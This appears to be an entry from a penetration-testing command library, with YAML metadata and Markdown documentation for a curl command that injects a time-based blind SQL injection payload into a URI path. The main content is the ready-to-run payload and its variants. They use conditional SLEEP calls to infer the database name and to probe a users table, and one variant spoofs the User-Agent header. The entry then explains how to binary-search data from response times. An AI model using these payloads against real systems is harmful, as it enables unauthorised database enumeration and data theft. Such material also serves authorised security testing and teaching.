---
data: >-
  curl -w "%{time_total}s" "http://target.com/vulnerable/path/1';
  IF(ASCII(SUBSTRING((SELECT database()),1,1))>109, SLEEP(5), 0) -- -" --output
  /dev/null
tags:
  - sqli
  - testing
  - timing
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: cebd5842-2356-4e38-8ffa-8c6f2905c8f3
created_at: '2025-12-14T03:46:20.624Z'
updated_at: '2025-12-14T03:46:20.624Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sleep-payload

## Command

```bash
curl -w "%{time_total}s" "http://target.com/vulnerable/path/1'; IF(ASCII(SUBSTRING((SELECT database()),1,1))>109, SLEEP(5), 0) -- -" --output /dev/null
```

## Description

This curl command injects a time-based blind SQL payload into a URI path to test for delays in database responses, helping confirm SQL injection and infer data like database names by measuring execution time.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-w "%{time_total}s"` | Outputs the total response time in seconds | Yes |
| URL argument | The target URI with injected SQL payload (e.g., conditional SLEEP) | Yes |
| `--output /dev/null` | Suppresses body output to focus on timing | No |

## Examples

### Basic Usage

```bash
curl -w "%{time_total}s" "http://target.com/path/1'" --output /dev/null
```

### Advanced Usage

```bash
curl -w "%{time_total}s" "http://target.com/path/1'; IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0) -- -" --output /dev/null -H "User-Agent: Mozilla/5.0"
```

## Expected Output

A single line with response time, e.g., "5.123" indicating a delay from SLEEP(5), or "0.234" for no delay. Use this to binary search data characters.

## Related

- [[Related Procedure|procedures/Exploit-Blind-Time-Based-SQL-Injection-via-URI-Path]]
